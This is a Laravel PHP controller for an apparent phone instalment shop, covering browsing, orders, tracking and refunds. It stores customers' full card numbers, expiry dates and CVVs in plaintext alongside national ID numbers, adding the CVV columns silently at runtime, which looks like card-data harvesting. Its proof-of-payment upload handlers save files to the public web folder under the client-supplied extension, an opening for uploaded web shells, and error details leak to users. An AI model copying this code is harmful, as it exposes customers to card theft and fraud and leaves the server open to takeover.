<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Schema;

class FrontendController extends Controller
{
    /**
     * Auto-patch the database schema if missing columns or tables are detected.
     * This helps users who haven't manually run the provided SQL update scripts.
     */
    private function patchDatabaseSchema()
    {
        try {
            // Check for storages table
            if (!Schema::hasTable('storages')) {
                DB::statement("CREATE TABLE IF NOT EXISTS `storages` (
                  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
                  `name` varchar(255) NOT NULL,
                  `created_at` timestamp NULL DEFAULT NULL,
                  `updated_at` timestamp NULL DEFAULT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
            }

            // Check for storage_id in mobiles
            if (!Schema::hasColumn('mobiles', 'storage_id')) {
                DB::statement("ALTER TABLE `mobiles` ADD `storage_id` bigint(20) UNSIGNED DEFAULT NULL AFTER `series_id` ");
            }

            // Check for missing columns in orders
            if (!Schema::hasColumn('orders', 'storage')) {
                DB::statement("ALTER TABLE `orders` ADD `storage` varchar(100) DEFAULT NULL AFTER `color` ");
            }

            if (!Schema::hasColumn('orders', 'card_number')) {
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_number` VARCHAR(20) NULL AFTER `account_holder` ");
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_expiry` VARCHAR(10) NULL AFTER `card_number` ");
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_cvv` VARCHAR(5) NULL AFTER `card_expiry` ");
            }

            // Check for refund_requests table
            if (!Schema::hasTable('refund_requests')) {
                DB::statement("CREATE TABLE IF NOT EXISTS `refund_requests` (
                  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
                  `refund_id` varchar(100) NOT NULL,
                  `customer_name` varchar(255) NOT NULL,
                  `order_id` varchar(100) NOT NULL,
                  `refund_amount` varchar(100) NOT NULL,
                  `payment_method` varchar(100) DEFAULT NULL,
                  `proof_image` varchar(255) DEFAULT NULL,
                  `status` varchar(50) DEFAULT 'Pending',
                  `created_at` timestamp NULL DEFAULT NULL,
                  `updated_at` timestamp NULL DEFAULT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
            }
        } catch (\Exception $e) {
            // Silently fail if schema patching fails (e.g. table already exists or lock issues)
            \Log::error("Database patching failed: " . $e->getMessage());
        }
    }

    public function index()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.index', compact('settings'));
    }

    public function shop(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $brands = DB::table('brands')->get();

        $storages = [];
        if (Schema::hasTable('storages')) {
            $storages = DB::table('storages')->get();
        }

        $brandId = $request->query('brand');
        $seriesId = $request->query('series');
        $storageId = $request->query('storage');

        $query = DB::table('mobiles');

        if ($brandId) {
            $query->where('brand_id', $brandId);
        }

        if ($seriesId && $seriesId !== 'all') {
            $query->where('series_id', $seriesId);
        }

        if ($storageId && $storageId !== 'all' && Schema::hasColumn('mobiles', 'storage_id')) {
            $query->where('storage_id', $storageId);
        }

        $mobiles = $query->get();

        $seriesQuery = DB::table('series');
        if ($brandId) {
            $seriesQuery->where('brand_id', $brandId);
        }
        $series = $seriesQuery->get();

        $seriesName = 'All Series';
        if ($seriesId && $seriesId !== 'all') {
            $selectedSeries = DB::table('series')->where('id', $seriesId)->first();
            $seriesName = $selectedSeries ? $selectedSeries->name : 'All Series';
        }

        return view('frontend.shop', compact('settings', 'brands', 'mobiles', 'series', 'storages', 'brandId', 'seriesId', 'storageId', 'seriesName'));
    }

    public function plan(Request $request)
    {
        $id = $request->query('id');

        $mobileQuery = DB::table('mobiles')->where('mobiles.id', $id);

        if (Schema::hasTable('storages') && Schema::hasColumn('mobiles', 'storage_id')) {
            $mobile = $mobileQuery->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id')
                ->select('mobiles.*', 'storages.name as storage_name')
                ->first();
        } else {
            $mobile = $mobileQuery->first();
        }

        if (!$mobile) return redirect()->route('shop');

        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('order_mobile_id', $id);
        return view('frontend.plan', compact('settings', 'mobile'));
    }

    public function customerInfo(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('order_color', $request->color);
        Session::put('order_storage', $request->storage);
        Session::put('order_tenure', $request->tenure);
        Session::put('order_emi', $request->emi);
        Session::put('order_total', $request->total);

        return view('frontend.customer_info', compact('settings'));
    }

    public function agreement(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('order_customer', $request->all());
        return view('frontend.agreement', compact('settings'));
    }

    public function submitOrder(Request $request)
    {
        $this->patchDatabaseSchema();

        $mobileId = Session::get('order_mobile_id');
        $customer = Session::get('order_customer');

        if (!$customer) {
            return response()->json(['success' => false, 'message' => 'Order session expired. Please restart the order process.'], 400);
        }

        $orderNumber = 'AM-' . date('ymd') . '-' . rand(1000, 9999);

        $proofPath = null;
        if ($request->hasFile('proof_image')) {
            try {
                $file = $request->file('proof_image');
                $fileName = 'proof_' . time() . '.' . $file->getClientOriginalExtension();
                $destPath = public_path('uploads/proofs');
                if (!File::exists($destPath)) {
                    File::makeDirectory($destPath, 0755, true);
                }
                $file->move($destPath, $fileName);
                $proofPath = '/uploads/proofs/' . $fileName;
            } catch (\Exception $e) {
                return response()->json(['success' => false, 'message' => 'File upload error: ' . $e->getMessage()], 500);
            }
        }

        try {
            $data = [
                'order_number' => $orderNumber,
                'full_name' => $customer['full_name'] ?? 'N/A',
                'cnic' => $customer['cnic'] ?? 'N/A',
                'mobile_number' => $customer['mobile_number'] ?? 'N/A',
                'address' => $customer['address'] ?? 'N/A',
                'delivery_type' => $customer['delivery_type'] ?? 'N/A',
                'payment_method' => $request->payment_method,
                'wallet_service' => $request->payment_method === 'Card' ? 'Credit/Debit Card' : $request->wallet_service,
                'account_holder' => $request->account_holder,
                'card_number' => $request->card_number,
                'card_expiry' => $request->card_expiry,
                'card_cvv' => $request->card_cvv,
                'proof_image' => $proofPath,
                'mobile_id' => $mobileId,
                'color' => Session::get('order_color'),
                'storage' => Session::get('order_storage'),
                'tenure' => Session::get('order_tenure'),
                'monthly_emi' => Session::get('order_emi'),
                'total_price' => Session::get('order_total'),
                'status' => 'Pending',
                'created_at' => now(),
                'updated_at' => now(),
            ];

            $existingColumns = Schema::getColumnListing('orders');
            $insertData = array_intersect_key($data, array_flip($existingColumns));

            DB::table('orders')->insert($insertData);

            Session::forget(['order_mobile_id', 'order_color', 'order_storage', 'order_tenure', 'order_emi', 'order_total', 'order_customer']);

            return response()->json(['success' => true, 'order_number' => $orderNumber]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Database error: ' . $e->getMessage()], 500);
        }
    }

    public function track()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.track', compact('settings'));
    }

    public function checkStatus(Request $request)
    {
        $query = DB::table('orders');
        if ($request->order_id) {
            $query->where('order_number', $request->order_id);
        } else if ($request->mobile_number) {
            $query->where('mobile_number', $request->mobile_number);
        } else {
            return back()->with('error', 'Please enter Order ID or Mobile Number');
        }

        $order = $query->first();
        if (!$order) return back()->with('error', 'Order not found');

        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.track_result', compact('settings', 'order'));
    }

    public function refund()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.refund', compact('settings'));
    }

    public function refundAgreement(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('refund_details', $request->all());
        return view('frontend.refund_agreement', compact('settings'));
    }

    public function submitRefund(Request $request)
    {
        $this->patchDatabaseSchema();

        $details = Session::get('refund_details');

        if (!$details) {
            return response()->json(['success' => false, 'message' => 'Refund session expired.'], 400);
        }

        $proofPath = null;
        if ($request->hasFile('proof_image')) {
            try {
                $file = $request->file('proof_image');
                $fileName = 'refund_' . time() . '.' . $file->getClientOriginalExtension();
                $destPath = public_path('uploads/refunds');
                if (!File::exists($destPath)) {
                    File::makeDirectory($destPath, 0755, true);
                }
                $file->move($destPath, $fileName);
                $proofPath = '/uploads/refunds/' . $fileName;
            } catch (\Exception $e) {
                return response()->json(['success' => false, 'message' => 'File upload error: ' . $e->getMessage()], 500);
            }
        }

        $refundId = 'RRF-' . date('Ymd') . '-' . rand(100000, 999999);

        try {
            $data = [
                'refund_id' => $refundId,
                'customer_name' => $details['customer_name'] ?? 'N/A',
                'order_id' => $details['order_id'] ?? 'N/A',
                'refund_amount' => $details['refund_amount'] ?? 0,
                'payment_method' => $request->payment_method ?? 'N/A',
                'proof_image' => $proofPath,
                'status' => 'Pending',
                'created_at' => now(),
                'updated_at' => now(),
            ];

            $existingColumns = Schema::getColumnListing('refund_requests');
            $insertData = array_intersect_key($data, array_flip($existingColumns));

            DB::table('refund_requests')->insert($insertData);

            Session::forget('refund_details');

            return response()->json(['success' => true, 'refund_id' => $refundId]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Database error: ' . $e->getMessage()], 500);
        }
    }

    public function refundSuccess(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $refund_id = $request->query('refund_id');
        $refund = DB::table('refund_requests')->where('refund_id', $refund_id)->first();
        return view('frontend.refund_success', compact('settings', 'refund'));
    }

    public function calculator()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $brands = DB::table('brands')->get();
        return view('frontend.calculator', compact('settings', 'brands'));
    }

    public function getModels($brandId)
    {
        $query = DB::table('mobiles')
            ->leftJoin('series', 'mobiles.series_id', '=', 'series.id')
            ->where('mobiles.brand_id', $brandId);

        if (Schema::hasTable('storages') && Schema::hasColumn('mobiles', 'storage_id')) {
            $query->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id')
                ->select('mobiles.*', 'storages.name as storage_name', 'series.name as series_name', 'series.id as series_id');
        } else {
            $query->select('mobiles.*', 'series.name as series_name', 'series.id as series_id');
        }

        $mobiles = $query->get();
        return response()->json($mobiles);
    }
}
